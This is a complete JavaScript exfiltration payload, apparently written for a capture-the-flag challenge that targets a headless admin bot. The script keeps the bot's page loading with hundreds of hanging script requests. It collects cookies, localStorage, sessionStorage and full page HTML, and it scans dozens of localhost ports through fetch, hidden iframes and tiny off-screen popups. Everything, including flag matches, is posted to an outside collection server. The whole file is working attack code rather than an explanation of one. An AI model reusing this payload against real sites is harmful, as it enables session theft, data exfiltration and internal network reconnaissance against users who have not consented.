(function() {
    'use strict';
    
    const SERVER = 'https://aab.requestcatcher.com';
    
    // =================================================================
    // UTILITY - Send data as readable text
    // =================================================================
    
    function send(endpoint, data) {
        const xhr = new XMLHttpRequest();
        xhr.open('POST', SERVER + '/' + endpoint, true);
        xhr.setRequestHeader('Content-Type', 'text/plain');
        xhr.send(data);
    }
    
    function log(msg) {
        send('log', '[' + new Date().toISOString() + '] ' + msg);
        console.log('[EXFIL]', msg);
    }
    
    // =================================================================
    // HOLD THE BOT - Keep page loading
    // =================================================================
    
    function holdBot() {
        log('🔒 Holding bot with hanging resources...');
        
        for (let i = 0; i < 950; i++) {
            const script = document.createElement('script');
            script.src = 'https://httpstat.us/200?sleep=999999&t=' + i;
            (document.head || document.documentElement).appendChild(script);
        }
        
        log('✅ Bot is HELD');
    }
    
    holdBot();
    
    // =================================================================
    // 1. EXTRACT CURRENT PAGE CONTENT
    // =================================================================
    
    function extractCurrentPage() {
        log('📄 Extracting current page content...');
        
        try {
            const pageData = {
                url: window.location.href,
                title: document.title,
                bodyText: document.body ? document.body.innerText : '',
                bodyHTML: document.body ? document.body.innerHTML : '',
                fullHTML: document.documentElement ? document.documentElement.outerHTML : '',
                cookies: document.cookie,
                localStorage: {},
                sessionStorage: {}
            };
            
            // Get localStorage
            try {
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    pageData.localStorage[key] = localStorage.getItem(key);
                }
            } catch(e) {}
            
            // Get sessionStorage
            try {
                for (let i = 0; i < sessionStorage.length; i++) {
                    const key = sessionStorage.key(i);
                    pageData.sessionStorage[key] = sessionStorage.getItem(key);
                }
            } catch(e) {}
            
            // Search for flags in the content
            const flagPatterns = [
                /INTIGRITI\{[^}]+\}/gi,
                /FLAG\{[^}]+\}/gi,
                /CTF\{[^}]+\}/gi,
                /flag:[^\s]+/gi,
                /[A-Z0-9]{32,}/g  // Long hex/base64 strings
            ];
            
            const foundFlags = [];
            flagPatterns.forEach(pattern => {
                const matches = pageData.bodyText.match(pattern);
                if (matches) {
                    foundFlags.push(...matches);
                }
            });
            
            const output = `
========================================
📄 CURRENT PAGE CONTENT
========================================
URL: ${pageData.url}
TITLE: ${pageData.title}
COOKIES: ${pageData.cookies || '(none)'}
========================================
🚩 POTENTIAL FLAGS FOUND: ${foundFlags.length}
${foundFlags.length > 0 ? foundFlags.join('\n') : '(none)'}
========================================
📝 BODY TEXT (innerText):
${pageData.bodyText}
========================================
🔍 LOCAL STORAGE:
${JSON.stringify(pageData.localStorage, null, 2)}
========================================
🔍 SESSION STORAGE:
${JSON.stringify(pageData.sessionStorage, null, 2)}
========================================
💻 FULL HTML (first 10000 chars):
${pageData.fullHTML.substring(0, 10000)}
========================================
`;
            
            send('CURRENT-PAGE', output);
            log('✅ Current page content extracted');
            
            // Send flags separately if found
            if (foundFlags.length > 0) {
                send('FLAGS-FOUND', foundFlags.join('\n'));
                log('🚩 FOUND ' + foundFlags.length + ' potential flags!');
            }
            
            return pageData;
            
        } catch(e) {
            log('❌ Error extracting current page: ' + e.message);
        }
    }
    
    // Extract current page immediately
    setTimeout(extractCurrentPage, 500);
    
    // =================================================================
    // 2. VISIT OTHER PAGES VIA FETCH
    // =================================================================
    
    function visitPageViaFetch(url, name) {
        log('🌐 Fetching page: ' + name);
        
        fetch(url)
            .then(r => r.text())
            .then(html => {
                // Parse the HTML
                const parser = new DOMParser();
                const doc = parser.parseFromString(html, 'text/html');
                
                const bodyText = doc.body ? doc.body.innerText : '';
                const title = doc.title;
                
                // Search for flags
                const flagPatterns = [
                    /INTIGRITI\{[^}]+\}/gi,
                    /FLAG\{[^}]+\}/gi,
                    /CTF\{[^}]+\}/gi,
                    /flag:[^\s]+/gi
                ];
                
                const foundFlags = [];
                flagPatterns.forEach(pattern => {
                    const matches = bodyText.match(pattern);
                    if (matches) {
                        foundFlags.push(...matches);
                    }
                });
                
                const output = `
========================================
📄 PAGE: ${name}
========================================
URL: ${url}
TITLE: ${title}
SIZE: ${html.length} bytes
========================================
🚩 FLAGS FOUND: ${foundFlags.length}
${foundFlags.length > 0 ? foundFlags.join('\n') : '(none)'}
========================================
📝 BODY TEXT:
${bodyText}
========================================
💻 HTML (first 5000 chars):
${html.substring(0, 5000)}
========================================
`;
                
                send('page-' + name, output);
                log('✅ Page extracted: ' + name);
                
                if (foundFlags.length > 0) {
                    send('FLAG-' + name, foundFlags.join('\n'));
                    log('🚩 FLAGS in ' + name + ': ' + foundFlags.join(', '));
                }
            })
            .catch(e => {
                log('❌ Failed to fetch ' + name + ': ' + e.message);
            });
    }
    
    // =================================================================
    // 3. VISIT OTHER PAGES VIA IFRAME
    // =================================================================
    
    function visitPageViaIframe(url, name) {
        log('🖼️ Creating iframe for: ' + name);
        
        const iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        iframe.src = url;
        
        (document.body || document.documentElement).appendChild(iframe);
        
        iframe.onload = function() {
            log('✅ Iframe loaded: ' + name);
            
            setTimeout(function() {
                try {
                    const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
                    const html = iframeDoc.documentElement.outerHTML;
                    const bodyText = iframeDoc.body ? iframeDoc.body.innerText : '';
                    const title = iframeDoc.title;
                    
                    // Search for flags
                    const flagPatterns = [
                        /INTIGRITI\{[^}]+\}/gi,
                        /FLAG\{[^}]+\}/gi,
                        /CTF\{[^}]+\}/gi
                    ];
                    
                    const foundFlags = [];
                    flagPatterns.forEach(pattern => {
                        const matches = bodyText.match(pattern);
                        if (matches) {
                            foundFlags.push(...matches);
                        }
                    });
                    
                    const output = `
========================================
🖼️ IFRAME: ${name}
========================================
URL: ${url}
TITLE: ${title}
========================================
🚩 FLAGS: ${foundFlags.length}
${foundFlags.length > 0 ? foundFlags.join('\n') : '(none)'}
========================================
📝 TEXT:
${bodyText}
========================================
💻 HTML:
${html.substring(0, 5000)}
========================================
`;
                    
                    send('iframe-' + name, output);
                    
                    if (foundFlags.length > 0) {
                        send('IFRAME-FLAG-' + name, foundFlags.join('\n'));
                        log('🚩 IFRAME FLAGS: ' + foundFlags.join(', '));
                    }
                    
                } catch(e) {
                    log('❌ Cannot read iframe ' + name + ': ' + e.message);
                }
            }, 1000);
        };
        
        iframe.onerror = function() {
            log('❌ Iframe error: ' + name);
        };
    }
    
    // =================================================================
    // 4. VISIT OTHER PAGES VIA POPUP
    // =================================================================
    
    function visitPageViaPopup(url, name) {
        log('🪟 Opening popup: ' + name);
        
        try {
            const popup = window.open(url, name, 'width=1,height=1,left=9999,top=9999');
            
            if (!popup) {
                log('❌ Popup blocked: ' + name);
                return;
            }
            
            let attempts = 0;
            const checkPopup = setInterval(function() {
                attempts++;
                
                try {
                    if (popup.document && popup.document.readyState === 'complete') {
                        const html = popup.document.documentElement.outerHTML;
                        const bodyText = popup.document.body ? popup.document.body.innerText : '';
                        const title = popup.document.title;
                        
                        // Search for flags
                        const flagMatch = bodyText.match(/INTIGRITI\{[^}]+\}|FLAG\{[^}]+\}|CTF\{[^}]+\}/gi);
                        
                        const output = `
========================================
🪟 POPUP: ${name}
========================================
URL: ${url}
TITLE: ${title}
========================================
🚩 FLAGS: ${flagMatch ? flagMatch.join('\n') : '(none)'}
========================================
📝 TEXT:
${bodyText}
========================================
`;
                        
                        send('popup-' + name, output);
                        
                        if (flagMatch) {
                            send('POPUP-FLAG-' + name, flagMatch.join('\n'));
                            log('🚩 POPUP FLAGS: ' + flagMatch.join(', '));
                        }
                        
                        popup.close();
                        clearInterval(checkPopup);
                    } else if (attempts > 20) {
                        log('⏱️ Timeout for popup: ' + name);
                        popup.close();
                        clearInterval(checkPopup);
                    }
                } catch(e) {
                    if (attempts > 20) {
                        log('❌ Popup error ' + name + ': ' + e.message);
                        popup.close();
                        clearInterval(checkPopup);
                    }
                }
            }, 500);
            
        } catch(e) {
            log('❌ Popup error: ' + e.message);
        }
    }
    
    // =================================================================
    // 5. TARGET PAGES TO VISIT
    // =================================================================
    
    const targetPages = [
        // Common application pages
        { url: 'http://localhost:110', name: 'home' },
        { url: 'http://localhost:111', name: 'index' },
        { url: 'http://localhost:123', name: 'quiz1' },
      { url: 'http://localhost:69', name: 'quiz2' },
      { url: 'http://localhost:68', name: 'quiz3' },
      { url: 'http://localhost:67', name: 'quiz4' },
      { url: 'http://localhost:53', name: 'quiz5' },
      { url: 'http://localhost:8888', name: 'api-flag' },
      { url: 'http://localhost:8000', name: 'api-flag' },
      { url: 'http://localhost:8080', name: 'api-flag' },
      { url: 'http://localhost:138', name: 'api-flag' },
        
        // Path traversal attempts
        { url: 'http://localhost:3306', name: 'flag-traversal' },
        { url: 'http://localhost:53', name: 'package' },
        { url: 'http://localhost:20', name: 'bot-source' },
      
        
        // Possible hidden pages
        { url: 'http://localhost:5000', name: 'admin' },
        { url: 'http://localhost:8080', name: 'flag-page' },
        { url: 'http://localhost:21', name: 'secret' },
        { url: 'http://localhost:22', name: 'internal' },
        
        // Quiz variations
        { url: 'http://localhost:23', name: 'quiz-page' },
        { url: 'http://localhost:25', name: 'quiz-json' },
        
        // API endpoints
        { url: 'http://localhost:137', name: 'api-root' },
        { url: 'http://localhost:138', name: 'api-flag' },
        { url: 'http://localhost:139', name: 'api-admin' },
      { url: 'http://localhost:143', name: 'api-flag' },
      { url: 'http://localhost:161', name: 'api-flag' },
      { url: 'http://localhost:162', name: 'api-flag' },
      { url: 'http://localhost:179', name: 'api-flag' },
      { url: 'http://localhost:389', name: 'api-flag' },
      { url: 'http://localhost:443', name: 'api-flag' },
      { url: 'http://localhost:445', name: 'api-flag' },
      { url: 'http://localhost:80', name: 'api-flag' },
      { url: 'http://localhost:465', name: 'api-flag' },
      { url: 'http://localhost:514', name: 'api-flag' },
      { url: 'http://localhost:1080', name: 'api-flag' },
      { url: 'http://localhost:1194', name: 'api-flag' },
      { url: 'http://localhost:1433', name: 'api-flag' },
      { url: 'http://localhost:1434', name: 'api-flag' },
      { url: 'http://localhost:1723', name: 'api-flag' },
      { url: 'http://localhost:1812', name: 'api-flag' },
      { url: 'http://localhost:1900', name: 'api-flag' },
      { url: 'http://localhost:2049', name: 'api-flag' },
      { url: 'http://localhost:2023', name: 'api-flag' },
      { url: 'http://localhost:2049', name: 'api-flag' },
      { url: 'http://localhost:8888', name: 'api-flag' },
      { url: 'http://localhost:8443', name: 'api-flag' },
      { url: 'http://localhost:5900', name: 'api-flag' },
      { url: 'http://localhost:5432', name: 'api-flag' },
      { url: 'http://localhost:5061', name: 'api-flag' },
      { url: 'http://localhost:5060', name: 'api-flag' },
      { url: 'http://localhost:4444', name: 'api-flag' },
      { url: 'http://localhost:4000', name: 'api-flag' },
      { url: 'http://localhost:3690', name: 'api-flag' },
      { url: 'http://localhost:3389', name: 'api-flag' },
      { url: 'http://localhost:3128', name: 'api-flag' }
    ];
    
    log('📋 Will visit ' + targetPages.length + ' pages');
    
    // =================================================================
    // 6. EXECUTE PAGE VISITS
    // =================================================================
    
    setTimeout(function() {
        log('🚀 Starting page visits...');
        
        // Try fetch first (fastest)
        targetPages.forEach(function(page, i) {
            setTimeout(function() {
                visitPageViaFetch(page.url, page.name);
            }, i * 300);
        });
        
        // Try iframe (more access)
        setTimeout(function() {
            targetPages.forEach(function(page, i) {
                setTimeout(function() {
                    visitPageViaIframe(page.url, page.name);
                }, i * 1000);
            });
        }, 5000);
        
        // Try popup (most compatible)
        setTimeout(function() {
            targetPages.forEach(function(page, i) {
                setTimeout(function() {
                    visitPageViaPopup(page.url, page.name);
                }, i * 2000);
            });
        }, 15000);
        
    }, 2000);
    
    // =================================================================
    // 7. HEARTBEAT
    // =================================================================
    
    let heartbeat = 0;
    setInterval(function() {
        heartbeat++;
        send('heartbeat', 'Heartbeat #' + heartbeat + ' at ' + new Date().toISOString());
        log('💓 Heartbeat #' + heartbeat);
    }, 30000); // Every 30 seconds
    
    // =================================================================
    // 8. SUMMARY
    // =================================================================
    
    setTimeout(function() {
        const summary = `
========================================
📊 EXFILTRATION SUMMARY
========================================
Time: ${new Date().toISOString()}
Status: Script running
Pages to visit: ${targetPages.length}
Methods: fetch, iframe, popup

Check RequestCatcher for:
- /CURRENT-PAGE (this page's content)
- /FLAGS-FOUND (flags from current page)
- /page-* (fetched pages)
- /iframe-* (iframe content)
- /popup-* (popup content)
- /FLAG-* (any flags found)
========================================
`;
        
        send('summary', summary);
        log('📊 Summary sent');
    }, 60000); // After 1 minute
    
    log('✅ Script initialized - extracting pages...');
    
})();
